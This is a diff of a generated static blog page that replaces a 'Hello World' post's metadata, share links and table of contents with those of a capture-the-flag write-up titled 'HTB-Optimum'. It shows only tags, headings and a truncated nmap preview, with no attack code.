+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/HTB/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>HTB</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/nishang/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>nishang</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Windows/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Windows</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/HFS/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>HFS</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/MS16032/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>MS16032</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Sherlock/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Sherlock</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Msf/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Msf</p></a></div>
+  <span hidden itemprop="keywords">HTB nishang Windows HFS MS16032 Sherlock Msf</span>
+  
+
 
         
       
@@ -2665,7 +2743,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://bzyfjb.github.io/2023/08/17/hello-world/&title=Hello World - Yao&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://bzyfjb.github.io/2023/08/22/HTB-Optimum/&title=HTB-Optimum - Yao&summary="
           
           >
           
@@ -2677,7 +2755,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://bzyfjb.github.io/2023/08/17/hello-world/&title=Hello World - Yao&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://bzyfjb.github.io/2023/08/22/HTB-Optimum/&title=HTB-Optimum - Yao&summary="
           
           >
           
@@ -2689,7 +2767,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=https://bzyfjb.github.io/2023/08/17/hello-world/&title=Hello World - Yao&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=https://bzyfjb.github.io/2023/08/22/HTB-Optimum/&title=HTB-Optimum - Yao&summary="
           
           >
           
@@ -2722,11 +2800,12 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2023/08/17/HTB-Bounty/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>HTB-Bounty</p>
-          <p class='content'>Informationnmap1234567891011┌──(kali㉿kali)-[~/Documents/htb]└─$ nmap -p- --min-rate 10000 10.10.1...</p>
-        </a>
       
+        <a class='next' href='/2023/08/20/HTB-Jeeves/'>
+          <p class='title'>HTB-Jeeves<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>Information&#x20;Port Scan使用nmap来做全端口扫描
+1234567891011121314┌──(kali㉿kali)-[~/Documents/htb]└─$ nm...</p>
+        </a>
       
     </div>
   
@@ -2744,7 +2823,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/2023/08/17/hello-world/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2023/08/22/HTB-Optimum/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -2786,7 +2865,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
   <div class='content'>
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Start"><span class="toc-number">1.</span> <span class="toc-text">Quick Start</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-a-new-post"><span class="toc-number">1.1.</span> <span class="toc-text">Create a new post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Run-server"><span class="toc-number">1.2.</span> <span class="toc-text">Run server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Generate-static-files"><span class="toc-number">1.3.</span> <span class="toc-text">Generate static files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Deploy-to-remote-sites"><span class="toc-number">1.4.</span> <span class="toc-text">Deploy to remote sites</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Information-x20"><span class="toc-number">1.</span> <span class="toc-text">Information </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">1.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web"><span class="toc-number">1.2.</span> <span class="toc-text">web</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB-GetShell"><span class="toc-number">2.</span> <span class="toc-text">WEB-GetShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege"><span class="toc-number">3.</span> <span class="toc-text">Privilege</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Find-vulnerabilities"><span class="toc-number">3.1.</span> <span class="toc-text">Find vulnerabilities</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-system-privilege"><span class="toc-number">3.2.</span> <span class="toc-text">Get system privilege</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">参考：</span></a></li></ol>
   </div>
 </section>
 
@@ -3542,7 +3621,7 @@ window.matchMedia('(prefers-color-scheme: light)').addListener(darkModelListener
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Yao","url":"https://bzyfjb.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Yao","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://bzyfjb.github.io/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://bzyfjb.github.io/","name":"Yao"}},{"@type":"ListItem","position":3,"item":{"@id":"https://bzyfjb.github.io/2023/08/17/hello-world/","name":"Hello World"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Yao","url":"https://bzyfjb.github.io/","keywords":null,"description":"","author":{"@type":"Person","name":"Yao","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://bzyfjb.github.io/","description":""},"publisher":{"@type":"Organization","name":"Yao","url":"https://bzyfjb.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://bzyfjb.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"Hello World","description":"","inLanguage":["zh-CN","en","default"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://bzyfjb.github.io/2023/08/17/hello-world/"},"author":{"@type":"Person","name":"Yao","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://bzyfjb.github.io/"},"publisher":{"@type":"Organization","name":"Yao","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://bzyfjb.github.io/2023/08/17/hello-world/","wordCount":0,"datePublished":"2023-08-17T14:40:04.811Z","dateModified":"2023-08-17T14:40:04.811Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Yao","url":"https://bzyfjb.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Yao","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://bzyfjb.github.io/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://bzyfjb.github.io/","name":"Yao"}},{"@type":"ListItem","position":2,"item":{"@id":"https://bzyfjb.github.io/categories/HTB/","name":"HTB"}},{"@type":"ListItem","position":3,"item":{"@id":"https://bzyfjb.github.io/2023/08/22/HTB-Optimum/","name":"HTB-Optimum"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Yao","url":"https://bzyfjb.github.io/","keywords":null,"description":"","author":{"@type":"Person","name":"Yao","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://bzyfjb.github.io/","description":""},"publisher":{"@type":"Organization","name":"Yao","url":"https://bzyfjb.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://bzyfjb.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"HTB-Optimum","description":"","inLanguage":["zh-CN","en","default"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://bzyfjb.github.io/2023/08/22/HTB-Optimum/"},"author":{"@type":"Person","name":"Yao","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://bzyfjb.github.io/"},"publisher":{"@type":"Organization","name":"Yao","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://bzyfjb.github.io/2023/08/22/HTB-Optimum/","wordCount":0,"datePublished":"2023-08-22T14:27:23.000Z","dateModified":"2023-08-22T14:30:11.577Z","articleSection":"HTB","keywords":"HTB,nishang,Windows,HFS,MS16032,Sherlock,Msf","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
